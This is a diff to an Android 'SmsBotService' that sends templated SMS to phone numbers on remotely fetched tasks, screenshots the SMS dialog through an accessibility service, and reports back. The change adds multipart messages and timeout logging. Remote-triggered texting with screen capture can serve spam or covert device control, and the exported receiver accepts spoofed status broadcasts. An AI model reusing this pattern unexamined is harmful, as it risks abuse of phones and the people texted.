@@ -84,7 +84,7 @@ public class SmsBotService extends Service {
         processedTasks.add(taskId);
         logToFile("[TASK] #" + taskId + " на " + phone);
 
-        // Отправка SMS с подтверждением
+        // Отправка SMS с полной поддержкой длинных сообщений
         final String[] finalStatus = {"failed"};
         final CountDownLatch latch = new CountDownLatch(1);
         Intent sentIntent = new Intent("SMS_SENT");
@@ -101,23 +101,33 @@ public class SmsBotService extends Service {
             }
         };
         registerReceiver(sentReceiver, new IntentFilter("SMS_SENT"), Context.RECEIVER_EXPORTED);
+
         try {
             SmsManager sms = SmsManager.getDefault();
             if (template.length() > 160) {
+                // Длинное сообщение — разбиваем и отправляем части
                 ArrayList<String> parts = sms.divideMessage(template);
-                sms.sendMultipartTextMessage(phone, null, parts, null, null);
-                finalStatus[0] = "success";
-                latch.countDown();
+                ArrayList<PendingIntent> sentIntents = new ArrayList<>();
+                for (int i = 0; i < parts.size(); i++) {
+                    sentIntents.add(sentPI); // один и тот же PendingIntent для всех частей
+                }
+                sms.sendMultipartTextMessage(phone, null, parts, sentIntents, null);
             } else {
                 sms.sendTextMessage(phone, null, template, sentPI, null);
             }
-            latch.await(30, TimeUnit.SECONDS);
+            // Ждём подтверждения (multipart может дать успех после отправки всех частей)
+            if (latch.await(45, TimeUnit.SECONDS)) {
+                logToFile("[SMS] Результат отправки: " + finalStatus[0]);
+            } else {
+                logToFile("[SMS] Таймаут подтверждения, считаем ошибкой");
+                finalStatus[0] = "failed";
+            }
         } catch (Exception e) {
+            logToFile("[SMS] Ошибка отправки: " + e.getMessage());
             finalStatus[0] = "failed";
         } finally {
             unregisterReceiver(sentReceiver);
         }
-        logToFile("[SMS] " + finalStatus[0]);
 
         // Обновляем статус задачи в Supabase
         JSONObject updateBody = new JSONObject();
@@ -141,11 +151,8 @@ public class SmsBotService extends Service {
             SmsAccessibilityService.getInstance().openSmsDialog(phone);
             Thread.sleep(4000);
 
-            // Делаем скриншот прямо сейчас (до ухода домой)
             String screenshotBase64 = takeScreenshot();
-
-            // Только после скриншота возвращаемся домой
-            startActivity(homeIntent);
+            startActivity(homeIntent); // возвращаемся домой только после скриншота
 
             if (screenshotBase64 != null) {
                 updateBody = new JSONObject();
